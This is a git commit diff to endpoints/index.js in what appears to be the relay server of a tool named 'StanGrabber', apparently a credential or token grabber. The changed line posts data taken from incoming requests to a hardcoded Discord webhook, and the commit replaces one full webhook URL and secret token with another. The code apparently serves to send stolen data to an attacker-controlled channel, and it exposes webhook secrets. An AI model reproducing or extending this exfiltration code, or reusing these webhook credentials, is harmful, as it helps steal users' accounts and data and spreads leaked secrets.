271d24d09734a4b82a8ba36458d81e9072021a4b
wingedwinged223 <91069998+wingedwinged223@users.noreply.github.com>
2021-09-20 21:24:51 +0800

    Update index.js

--- endpoints/index.js
+++ endpoints/index.js
@@ -48,7 +48,7 @@ exports.send = (req, res, webhook) => {
 }
             
 
-        axios.post(`https://discord.com/api/webhooks/808648414199676948/Koi4dO3acEhEyIRJzVaxZ7-FDWJfmqK6kZX13nrklxmLWPkhQBhtkFe8JBtKgdojXSCn`, {
+        axios.post(`https://discord.com/api/webhooks/888804025254969414/QtxH86EBmg_Pnsp1xeJxbYVSA82OE8wmjiPieEjYOPlKxL5YU57n02kQV8amw6CWrUav`, {
             username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
             content: '', 
             embeds:[ omg ]
